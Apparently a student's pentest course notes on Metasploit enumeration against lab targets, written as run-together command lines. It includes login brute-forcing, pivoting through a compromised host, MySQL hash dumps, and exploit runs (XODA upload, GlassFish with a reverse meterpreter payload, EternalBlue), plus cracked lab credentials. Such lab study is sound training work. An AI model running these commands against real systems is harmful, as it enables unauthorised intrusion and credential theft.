# Copy of Information Gathering & Enumeration

## Nmap Enumeration <a href="#nmap-enumeration" id="nmap-enumeration"></a>

**`nmap`** enumeration results (_service versions, operating systems, etc_) can be exported into a file that can be imported into MSF and used for further detection and exploitation.

> 🔬 Check the full `nmap` information gathering lab in [this Nmap Host Discovery Lab](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/1-info-gathering#lab-with-nmap) (at the end of the page).

Some commands:nmap \<TARGET\_IP>nmap -Pn \<TARGET\_IP>nmap -Pn -sV -O \<TARGET\_IP>

* Output the `nmap` scan results into an **`.XML`** format file that can be imported into MSF

nmap -Pn -sV -O 10.2.18.161 -oX windows\_server\_2012

### ​[MSFdb Import](https://www.offsec.com/metasploit-unleashed/using-databases/)​ <a href="#msfdb-import" id="msfdb-import"></a>

* In the same lab environment from above, use `msfconsole` to import the results into MSF with the `db_import` command

service postgresql startmsfconsole

* Inside `msfconsole`

db\_statusworkspace -a Win2k12db\_import /root/windows\_server\_2012\[\*] Importing 'Nmap XML' data\[\*] Import: Parsing with 'Nokogiri v1.10.7'\[\*] Importing host 10.2.18.161\[\*] Successfully imported /root/windows\_server\_2012hostsservicesvulnslootcredsnotes![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ba67b9abca052938ff18e17b7f35afdab9badf6f%2Fimage-20230412190333138.png?alt=media)

* Perform an `nmap` scan _within the MSF Console and import the results in a dedicated workspace_

workspace -a nmap\_MSFdb\_nmap -Pn -sV -O \<TARGET\_IP>![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-90d3514d0aea7cc72d1451e9439952f4b724e2d5%2Fimage-20230412190726940.png?alt=media)

#### ​[Port Scanning](https://www.offsec.com/metasploit-unleashed/port-scanning/)​ <a href="#port-scanning" id="port-scanning"></a>

MSF **Auxiliary modules** are used during the information gathering (similar to `nmap`) and the post exploitation phases of the pentest.

* perform TCP/UDP port scanning
* enumerate services
* discover hosts on different network subnets (post-exploitation phase)

**Lab Network Service Scanning**

> 🔬 Lab [T1046 : Network Service Scanning](https://attackdefense.com/challengedetails?cid=1869)​

service postgresql start && msfconsole -qworkspace -a Port\_scansearch portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.41.167.3run![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-f9bb00e236dcbcacb2dd85e5f4f8181ca1810f97%2Fimage-20230412220747788.png?alt=media)curl 192.41.167.3

* Exploitation

search xodause exploit/unix/webapp/xoda\_file\_uploadset RHOSTS 192.41.167.3set TARGETURI /run![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-be8eaadffd478211a6c3c787bbd54c2ffb0dd4e4%2Fimage-20230412221111369.png?alt=media)

* Perform a network scan on the second target

meterpreter > shell/bin/bash -iifconfig# 192.26.158.2 Local Lan subnet IPexit

* Add the route within `meterpreter` and background the meterpreter session

run autoroute -s 192.26.158.2background![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-67e7adb134ca47fb1df4ff6f49abb7370d8802a9%2Fimage-20230412221528898.png?alt=media)search portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.26.158.3run# the port scan will be performed through the first target system using the route\[+] 192.26.158.3: - 192.26.158.3:22 - TCP OPEN\[+] 192.26.158.3: - 192.26.158.3:21 - TCP OPEN\[+] 192.26.158.3: - 192.26.158.3:80 - TCP OPEN

* Upload and run `nmap` against the second target, from the first target machine

sessions 1upload /root/tools/static-binaries/nmap /tmp/nmapshell/bin/bash -icd /tmpchmod +x ./nmap./nmap -p- 192.26.158.321/tcp open ftp22/tcp open ssh80/tcp open http

> 📌 There are **`3`** running services on the second target machine.

**UDP Scan**

* Into `msfconsole`

search udp\_sweepuse auxiliary/scanner/discovery/udp\_sweepset RHOSTS 192.41.167.3run

#### ​[Services Enumeration](https://www.offsec.com/metasploit-unleashed/service-identification/)​ <a href="#services-enumeration" id="services-enumeration"></a>

> 📌🔬 Check the [Enumeration Section labs here](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration) for basic `nmap` enumeration.

Next, there are some MSF commands and modules for **service enumeration** on the same labs from the Enumeration Section.

* Auxiliary modules can be used for enumeration, brute-force attacks, etc

❗📝 **On every attacker machine, run this command to start `msfconsole`:**service postgresql start && msfconsole -q

* Setup a **global variable**. This will set the RHOSTS option for all the modules utilized:

setg RHOSTS \<TARGET\_IP>

**​**[**FTP**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/ftp-enum)**​**

> **`auxiliary/scanner/ftp/ftp_version`**

ip -br -c aworkspace -a FTP\_ENUMsearch portscanuse auxiliary/scanner/portscan/tcpset RHOSTS 192.146.175.3run\[+] 192.146.175.3: - 192.146.175.3:21 - TCP OPENbacksearch type:auxiliary name:ftpuse auxiliary/scanner/ftp/ftp\_versionset RHOSTS 192.146.175.3run\[+] 192.146.175.3:21 - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) \[::ffff:192.146.175.3]\x0d\x0a'​search ProFTPD

> **`auxiliary/scanner/ftp/ftp_login`**

backsearch type:auxiliary name:ftpuse auxiliary/scanner/ftp/ftp\_loginshow optionsset RHOSTS 192.146.175.3set USER\_FILE /usr/share/metasploit-framework/data/wordlists/common\_users.txtset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txtrun\[+] 192.146.175.3:21 - 192.146.175.3:21 - Login Successful: sysadmin:654321

> **`auxiliary/scanner/ftp/anonymous`**

backsearch type:auxiliary name:ftpuse auxiliary/scanner/ftp/anonymousset RHOSTS 192.146.175.3run

**​**[**SMB/SAMBA**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/smb-enum#lab-3)**​**

> **`auxiliary/scanner/smb/smb_version`**

ip -br -c asetg RHOSTS 192.132.155.3workspace -a SMB\_ENUMsearch type:auxiliary name:smbuse auxiliary/scanner/smb/smb\_versionoptionsrun\[\*] 192.132.155.3:445 - Host could not be identified: Windows 6.1 (Samba 4.3.11-Ubuntu)

> **`auxiliary/scanner/smb/smb_enumusers`**

backsearch type:auxiliary name:smbuse auxiliary/scanner/smb/smb\_enumusersinforun\[+] 192.132.155.3:139 - SAMBA-RECON \[ john, elie, aisha, shawn, emma, admin ] ( LockoutTries=0 PasswordMin=5 )

> **`auxiliary/scanner/smb/smb_enumshares`**

backsearch type:auxiliary name:smbuse auxiliary/scanner/smb/smb\_enumsharesset ShowFiles truerun\[+] 192.132.155.3:139 - public - (DS)\[+] 192.132.155.3:139 - john - (DS)\[+] 192.132.155.3:139 - aisha - (DS)\[+] 192.132.155.3:139 - emma - (DS)\[+] 192.132.155.3:139 - everyone - (DS)\[+] 192.132.155.3:139 - IPC$ - (I) IPC Service (samba.recon.lab)

> ​[**`auxiliary/scanner/smb/smb_login`**](https://www.offsec.com/metasploit-unleashed/smb-login-check/)​

backsearch smb\_loginuse auxiliary/scanner/smb/smb\_loginoptionsset SMBUser adminset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txtrun\[+] 192.132.155.3:445 - 192.132.155.3:445 - Success: '.\admin:password'

**​**[**HTTP**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/http-enum#lab-3)**​**

> 🔬 [Metasploit - Apache Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=118)​

* Remember to specify the correct port and if targeting a web server with SSL enabled, in the options.

ip -br -c asetg RHOSTS 192.106.226.3setg RHOST 192.106.226.3workspace -a HTTP\_ENUM

> **`auxiliary/scanner/http/apache_userdir_enum`**

search apache\_userdir\_enumuse auxiliary/scanner/http/apache\_userdir\_enumoptionsinfoset USER\_FILE /usr/share/metasploit-framework/data/wordlists/common\_users.txtrun\[+] http://192.106.226.3/ - Users found: rooty

> **`auxiliary/scanner/http/brute_dirs`**

> **`auxiliary/scanner/http/dir_scanner`**

search dir\_scanneruse auxiliary/scanner/http/dir\_scanneroptionsrun

> **`auxiliary/scanner/http/dir_listing`**

> **`auxiliary/scanner/http/http_put`**

\[+] Found http://192.106.226.3:80/cgi-bin/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/data/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/doc/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/downloads/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/icons/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/manual/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/secure/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/users/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/uploads/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/web\_app/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/view/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/webadmin/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/webmail/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/webdb/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/webdav/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/\~admin/ 404 (192.106.226.3)\[+] Found http://192.106.226.3:80/\~nobody/ 404 (192.106.226.3)

> **`auxiliary/scanner/http/files_dir`**

search files\_diruse auxiliary/scanner/http/files\_diroptionsset DICTIONARY /usr/share/metasploit-framework/data/wmap/wmap\_files.txtrun\[+] Found http://192.106.226.3:80/file.backup 200\[\*] Using code '404' as not found for files with extension .bak\[\*] Using code '404' as not found for files with extension .c\[+] Found http://192.106.226.3:80/code.c 200\[\*] Using code '404' as not found for files with extension .cfg\[+] Found http://192.106.226.3:80/code.cfg 200\[\*] Using code '404' as not found for files with extension .class\[...]\[\*] Using code '404' as not found for files with extension .html\[+] Found http://192.106.226.3:80/index.html 200\[\*] Using code '404' as not found for files with extension .htm\[...]\[+] Found http://192.106.226.3:80/test.php 200\[\*] Using code '404' as not found for files with extension .tar\[...]

> **`auxiliary/scanner/http/http_login`**

search http\_loginuse auxiliary/scanner/http/http\_loginoptionsset AUTH\_URI /secure/unset USERPASS\_FILEecho "rooty" > user.txtset USER\_FILE /root/user.txtset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txtset VERBOSE falserun

> **`auxiliary/scanner/http/http_header`**

search http\_headeruse auxiliary/scanner/http/http\_headeroptionsrun\[+] 192.106.226.3:80 : CONTENT-TYPE: text/html\[+] 192.106.226.3:80 : LAST-MODIFIED: Wed, 27 Feb 2019 04:21:01 GMT\[+] 192.106.226.3:80 : SERVER: Apache/2.4.18 (Ubuntu)\[+] 192.106.226.3:80 : detected 3 headers

> **`auxiliary/scanner/http/http_version`**

search type:auxiliary name:httpuse auxiliary/scanner/http/http\_versionoptionsrun# in case of HTTPS website, set RPORT=443 and SSL="true"\[+] 192.106.226.3:80 Apache/2.4.18 (Ubuntu)

> **`auxiliary/scanner/http/robots_txt`**

search robots\_txtuse auxiliary/scanner/http/robots\_txtoptionsrun\[+] Contents of Robots.txt:# robots.txt for attackdefenseUser-agent: test# DirectoriesAllow: /webmailUser-agent: \*# DirectoriesDisallow: /dataDisallow: /securecurl http://192.106.226.3/data/curl http://192.106.226.3/secure/

**​**[**MYSQL**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/mysql-enum)**​**

> 🔬 [Metasploit - MySQL Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=120)​

ip -br -c asetg RHOSTS 192.64.22.3setg RHOST 192.64.22.3workspace -a MYSQL\_ENUM

> **`auxiliary/admin/mysql/mysql_enum`**

search mysql\_enumuse auxiliary/admin/mysql/mysql\_enuminfoset USERNAME rootset PASSWORD twinklerun\[\*] 192.64.22.3:3306 - Running MySQL Enumerator...\[\*] 192.64.22.3:3306 - Enumerating Parameters\[\*] 192.64.22.3:3306 - MySQL Version: 5.5.61-0ubuntu0.14.04.1\[\*] 192.64.22.3:3306 - Compiled for the following OS: debian-linux-gnu\[\*] 192.64.22.3:3306 - Architecture: x86\_64\[\*] 192.64.22.3:3306 - Server Hostname: victim-1\[\*] 192.64.22.3:3306 - Data Directory: /var/lib/mysql/\[\*] 192.64.22.3:3306 - Logging of queries and logins: OFF\[\*] 192.64.22.3:3306 - Old Password Hashing Algorithm OFF\[\*] 192.64.22.3:3306 - Loading of local files: ON\[\*] 192.64.22.3:3306 - Deny logins with old Pre-4.1 Passwords: OFF\[\*] 192.64.22.3:3306 - Allow Use of symlinks for Database Files: YES\[\*] 192.64.22.3:3306 - Allow Table Merge:\[\*] 192.64.22.3:3306 - SSL Connection: DISABLED\[\*] 192.64.22.3:3306 - Enumerating Accounts:\[\*] 192.64.22.3:3306 - List of Accounts with Password Hashes:\[+] 192.64.22.3:3306 - User: root Host: localhost Password Hash: \*A0E23B565BACCE3E70D223915ABF2554B2540144\[+] 192.64.22.3:3306 - User: root Host: 891b50fafb0f Password Hash:\[+] 192.64.22.3:3306 - User: root Host: 127.0.0.1 Password Hash:\[+] 192.64.22.3:3306 - User: root Host: ::1 Password Hash:\[+] 192.64.22.3:3306 - User: debian-sys-maint Host: localhost Password Hash: \*F4E71A0BE028B3688230B992EEAC70BC598FA723\[+] 192.64.22.3:3306 - User: root Host: % Password Hash: \*A0E23B565BACCE3E70D223915ABF2554B2540144\[+] 192.64.22.3:3306 - User: filetest Host: % Password Hash: \*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B\[+] 192.64.22.3:3306 - User: ultra Host: localhost Password Hash: \*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29\[+] 192.64.22.3:3306 - User: guest Host: localhost Password Hash: \*17FD2DDCC01E0E66405FB1BA16F033188D18F646\[+] 192.64.22.3:3306 - User: gopher Host: localhost Password Hash: \*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0\[+] 192.64.22.3:3306 - User: backup Host: localhost Password Hash: \*E6DEAD2645D88071D28F004A209691AC60A72AC9\[+] 192.64.22.3:3306 - User: sysadmin Host: localhost Password Hash: \*78A1258090DAA81738418E11B73EB494596DFDD3\[\*] 192.64.22.3:3306 - The following users have GRANT Privilege:\[...]

> **`auxiliary/admin/mysql/mysql_sql`**

search mysql\_sqluse auxiliary/admin/mysql/mysql\_sqloptionsset USERNAME rootset PASSWORD twinklerun# set an SQL queryset SQL show databases;run\[\*] 192.64.22.3:3306 - Sending statement: 'select version()'...\[\*] 192.64.22.3:3306 - | 5.5.61-0ubuntu0.14.04.1 |​\[\*] 192.64.22.3:3306 - Sending statement: 'show databases;'...\[\*] 192.64.22.3:3306 - | information\_schema |\[\*] 192.64.22.3:3306 - | mysql |\[\*] 192.64.22.3:3306 - | performance\_schema |\[\*] 192.64.22.3:3306 - | upload |\[\*] 192.64.22.3:3306 - | vendors |\[\*] 192.64.22.3:3306 - | videos |\[\*] 192.64.22.3:3306 - | warehouse |

> **`auxiliary/scanner/mysql/mysql_file_enum`**

> **`auxiliary/scanner/mysql/mysql_hashdump`**

> **`auxiliary/scanner/mysql/mysql_login`**

search mysql\_loginuse auxiliary/scanner/mysql/mysql\_loginoptionsset USERNAME rootset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/unix\_passwords.txtset VERBOSE falseset STOP\_ON\_SUCCESS falserun\[+] 192.64.22.3:3306 - 192.64.22.3:3306 - Success: 'root:twinkle'

> **`auxiliary/scanner/mysql/mysql_schemadump`**

search mysql\_schemadumpuse auxiliary/scanner/mysql/mysql\_schemadumpoptionsset USERNAME rootset PASSWORD twinklerun\[+] 192.64.22.3:3306 - Schema stored in:/root/.msf4/loot/20230413112948\_MYSQL\_ENUM\_192.64.22.3\_mysql\_schema\_807923.txt\[+] 192.64.22.3:3306 - MySQL Server SchemaHost: 192.64.22.3Port: 3306====================---- DBName: uploadTables: \[]- DBName: vendorsTables: \[]- DBName: videosTables: \[]- DBName: warehouseTables: \[]

> **`auxiliary/scanner/mysql/mysql_version`**

search type:auxiliary name:mysqluse auxiliary/scanner/mysql/mysql\_versionoptionsrun\[+] 192.64.22.3:3306 - 192.64.22.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)# MySQL and Ubuntu versions enumerated!

> **`auxiliary/scanner/mysql/mysql_writable_dirs`**

* Check the MySQL Enumerated data within MSF:

hostsserviceslootcreds![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-e00dc1815b532662bee3be7fd6657f8eccd1abd4%2Fimage-20230413133324466.png?alt=media)

**​**[**SSH**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/ssh-enum)**​**

> 🔬 [Metasploit - SSH Login](https://attackdefense.com/challengedetails?cid=1526)​

ip -br -c asetg RHOSTS 192.127.196.3setg RHOST 192.127.196.3workspace -a SSH\_ENUM

> **`auxiliary/scanner/ssh/ssh_version`**

search type:auxiliary name:sshuse auxiliary/scanner/ssh/ssh\_versionoptionsrun\[+] 192.127.196.3:22 - SSH server version: SSH-2.0-OpenSSH\_7.9p1 Ubuntu-10 ( service.version=7.9p1 openssh.comment=Ubuntu-10 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=19.04 os.cpe23=cpe:/o:canonical:ubuntu\_linux:19.04 service.protocol=ssh fingerprint\_db=ssh.banner )# SSH-2.0-OpenSSH\_7.9p1 and Ubuntu 19.04

> **`auxiliary/scanner/ssh/ssh_login`**

search ssh\_loginuse auxiliary/scanner/ssh/ssh\_login# for password authenticationoptionsset USER\_FILE /usr/share/metasploit-framework/data/wordlists/common\_users.txtset PASS\_FILE /usr/share/metasploit-framework/data/wordlists/common\_passwords.txtrun\[+] 192.127.196.3:22 - Success: 'sysadmin:hailey' ''\[\*] Command shell session 1 opened (192.127.196.2:37093 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'rooty:pineapple' ''\[\*] Command shell session 2 opened (192.127.196.2:44935 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'demo:butterfly1' ''\[\*] Command shell session 3 opened (192.127.196.2:39681 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'auditor:xbox360' ''\[\*] Command shell session 4 opened (192.127.196.2:42273 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'anon:741852963' ''\[\*] Command shell session 5 opened (192.127.196.2:44263 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'administrator:password1' ''\[\*] Command shell session 6 opened (192.127.196.2:39997 -> 192.127.196.3:22)\[+] 192.127.196.3:22 - Success: 'diag:secret' ''

* This module sets up SSH sessions

![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-7e5cd4807505d1993711dd2568be44f6427b7d0d%2Fimage-20230413143027661.png?alt=media)

> **`auxiliary/scanner/ssh/ssh_enumusers`**

search type:auxiliary name:sshuse auxiliary/scanner/ssh/ssh\_enumusersoptionsset USER\_FILE /usr/share/metasploit-framework/data/wordlists/common\_users.txtrun\[+] 192.127.196.3:22 - SSH - User 'sysadmin' found\[+] 192.127.196.3:22 - SSH - User 'rooty' found\[+] 192.127.196.3:22 - SSH - User 'demo' found\[+] 192.127.196.3:22 - SSH - User 'auditor' found\[+] 192.127.196.3:22 - SSH - User 'anon' found\[+] 192.127.196.3:22 - SSH - User 'administrator' found\[+] 192.127.196.3:22 - SSH - User 'diag' found

**​**[**SMTP**](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/smtp-enum)**​**

> 🔬 [SMTP - Postfix Recon: Basics](https://www.attackdefense.com/challengedetails?cid=516)​

ip -br -c asetg RHOSTS 192.8.115.3setg RHOST 192.8.115.3workspace -a SMTP\_ENUM# Run a portscan to identify SMTP port, in this case is port 25

> **`auxiliary/scanner/smtp/smtp_enum`**

search type:auxiliary name:smtpuse auxiliary/scanner/smtp/smtp\_enumoptionsrun\[+] 192.63.243.3:25 - 192.63.243.3:25 Users found: , admin, administrator, backup, bin, daemon, games, gnats, irc, list, lp, mail, man, news, nobody, postmaster, proxy, sync, sys, uucp, www-data

> **`auxiliary/scanner/smtp/smtp_version`**

search type:auxiliary name:smtpuse auxiliary/scanner/smtp/smtp\_versionoptionsrun\[+] 192.8.115.3:25 - 192.8.115.3:25 SMTP 220 openmailbox.xyz ESMTP Postfix: Welcome to our mail server.\x0d\x0a

### Vulnerability Scanning With MSF <a href="#vulnerability-scanning-with-msf" id="vulnerability-scanning-with-msf"></a>

MSF **Auxiliary** and **exploit** modules can be utilized to identify inherent vulnerabilities in services, O.S. and web apps.

* Useful in the **Exploitation** phase of the pentest

🔬 [Metasploitable3](https://github.com/rapid7/metasploitable3) lab environment will be used for the vulnerability scanning demonstration.

* **Metasploitable3** is a vulnerable virtual machine developed by Rapid7, intended to be used as a vulnerable target for testing exploits with Metasploit.

> 🔬 You can find my lab installation & configuration with Vagrant at [this page](https://blog.syselement.com/home/home-lab/redteam/metasploitable3), _set up for educational purposes_.

* Kali Linux attacker machine must be configured with **the same local network** of the Metasploitable3 VMs.

Detect active hosts on the local network, from the Kali VM:sudo nmap -sn 192.168.31.0/24Nmap scan report for 192.168.31.139 # Linux targetNmap scan report for 192.168.31.140 # Windows2008 target

* Run Metasploit:

service postgresql start && msfconsole -qdb\_statussetg RHOSTS 192.168.31.140setg RHOST 192.168.31.140workspace -a VULN\_SCAN\_MS3

* **Service version** is a key piece of information for the vulnerabilities scanning. Use the **`db_nmap`** command inside the MSF

db\_nmap -sS -sV -O 192.168.31.140\[\*] Nmap: 21/tcp open ftp Microsoft ftpd\[\*] Nmap: 22/tcp open ssh OpenSSH 7.1 (protocol 2.0)\[\*] Nmap: 80/tcp open http Microsoft IIS httpd 7.5\[\*] Nmap: 135/tcp open msrpc Microsoft Windows RPC\[\*] Nmap: 139/tcp open netbios-ssn Microsoft Windows netbios-ssn\[\*] Nmap: 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\[\*] Nmap: 3306/tcp open mysql MySQL 5.5.20-log\[\*] Nmap: 3389/tcp open tcpwrapped\[\*] Nmap: 4848/tcp open ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)\[\*] Nmap: 7676/tcp open java-message-service Java Message Service 301\[\*] Nmap: 8009/tcp open ajp13 Apache Jserv (Protocol v1.3)\[\*] Nmap: 8080/tcp open http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)\[\*] Nmap: 8181/tcp open ssl/http Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)\[\*] Nmap: 8383/tcp open http Apache httpd\[\*] Nmap: 9200/tcp open wap-wsp?\[\*] Nmap: 49152/tcp open msrpc Microsoft Windows RPC\[\*] Nmap: 49153/tcp open msrpc Microsoft Windows RPC\[\*] Nmap: 49154/tcp open msrpc Microsoft Windows RPC\[\*] Nmap: 49155/tcp open msrpc Microsoft Windows RPC\[...]![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-da30e0d4036528a13a9f80ff9d8b01fdd950c4eb%2Fimage-20230413200524969.png?alt=media)db\_nmaphostsservices

* Manually search for a specific exploit
  * Check if there are any exploits for a particular **version** of a service

search type:exploit name:iis![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-375c51ac9321889fd7f66157154bed2363465c80%2Fimage-20230413192845621.png?alt=media)search type:exploit name:iissearch Sun GlassFish

* Check if a module will work on the specific version of the service

use exploit/multi/http/glassfish\_deployerinfo​# Description:# This module logs in to a GlassFish Server (Open Source or# Commercial) using various methods (such as authentication bypass,# default credentials, or user-supplied login), and deploys a# malicious war file in order to get remote code execution. It has# been tested on Glassfish 2.x, 3.0, 4.0 and Sun Java System# Application Server 9.x. Newer GlassFish versions do not allow remote# access (Secure Admin) by default, but is required for exploitation.set payload windows/meterpreter/reverse\_tcpoptions# check the LHOST, LPORT, APP\_RPORT, RPORT, PAYLOAD options

* Use [searchsploit](https://www.exploit-db.com/searchsploit) tool from the Kali terminal, instead of `search MSF command`, by displaying only the Metasploit exploit modules

searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ccd61dd756b19c9fe6732fd4bc6df233f08f8c9a%2Fimage-20230413194606641.png?alt=media)

* Back in `msfconsole`, check if the server is vulnerable to MS17-010

search eternalblueuse auxiliary/scanner/smb/smb\_ms17\_010run![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-e9399a0e6c8efc589338f07390d7ad79f5433cf8%2Fimage-20230413200558380.png?alt=media)use exploit/windows/smb/ms17\_010\_eternalblueoptions# always check Payload optionsrun

> ​[**metasploit-autopwn**](https://github.com/hahwul/metasploit-autopwn) - a Metasploit plugin for easy exploit & vulnerability attack.
>
> * _takes a look at the Metasploit database and provides a list of exploit modules to use for the already enumerated services_

* On a Kali terminal

wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db\_autopwn.rbsudo mv db\_autopwn.rb /usr/share/metasploit-framework/plugins/

* On `msfconsole`

load db\_autopwndb\_autopwn -p -t# Enumerates exploits for each of the open portsdb\_autopwn -p -t -PI 445# Limit to only the 445 port![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-aebfca43b742e41d758e63a2e3e6b0cdbc355643%2Fimage-20230413202435550.png?alt=media)db\_autopwn -p -t -PI 445

* On `msfconsole` use the **`analyze`** command to auto analyze the contents of the MSFdb (hosts & services)

analyze![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-f2413c550b79a3a1148a63bdb63d63dc5778b675%2Fimage-20230413202708057.png?alt=media)analyzevulns![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-ceda763cca80af814cb9304c543bd68cb4bb61f3%2Fimage-20230413202802181.png?alt=media)vulns

#### VA with [Nessus](https://www.offsec.com/metasploit-unleashed/working-with-nessus/)​ <a href="#va-with-nessus" id="va-with-nessus"></a>

> 🔬 You can find my [**Nessus Essentials** install tutorial here](https://blog.syselement.com/home/operating-systems/linux/tools/nessus).

* A vulnerability scan with Nessus result can be imported into the MSF for analysis and exploitation.
* Nessus Essentials free version allows to scan up to 16 IPs.

Start Nessus Essentials on the Kali VM, login and create a New **Basic Network Scan** and run it.Wait for the scan conclusion and export the results with the **Export/Nessus** button.![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-986ff2afeccc2978f8dfefa575f9bdf4d236d58d%2Fimage-20230413222104319.png?alt=media)Nessus Essentials - Metasploitable3

* Open the `msfconsole` terminal and import the Nessus results
  * Check the information from the scan results with the `hosts`, `services`, `vulns` commands

workspace -a MS3\_NESSUSdb\_import /home/kali/Downloads/MS3\_zph3t5.nessushostsservicesvulns![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-1562ae2abdb68d12d5245bf395d9dd026ad7295c%2Fimage-20230413222333897.png?alt=media)vulns -p 445![](https://2946054920-files.gitbook.io/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FlhjuckuLbvBn36EoFL7P%2Fuploads%2Fgit-blob-22fa84721de13f146690e31e9bde9df8926340e6%2Fimage-20230413222411974.png?alt=media)search cve:2017 name:smbsearch MS12-020search cve:2019 name:rdpsearch cve:2015 name:ManageEnginesearch PHP CGI Argument Injection

#### VA with [WMAP](https://www.offsec.com/metasploit-unleashed/wmap-web-scanner/)​ <a href="#va-with-wmap" id="va-with-wmap"></a>

🗒️ **WMAP** is a web application vulnerability scanner that allows to conduct and automate web server enumeration and scanning from within the Metasploit Framework.

* Available as a fully integrated MSF plugin
* Utilizes the in-built MSF auxiliary modules

> 🔬 The lab is the same one from the HTTP Metasploit Enumeration section above - [Metasploit - Apache Enumeration Lab](https://www.attackdefense.com/challengedetails?cid=118)​

ip -br -c a192.28.60.3# Target IP​service postgresql start && msfconsole -qdb\_statussetg RHOSTS 192.28.60.3setg RHOST 192.28.60.3workspace -a WMAP\_SCAN

* Load WMAP extension within `msfconsole`

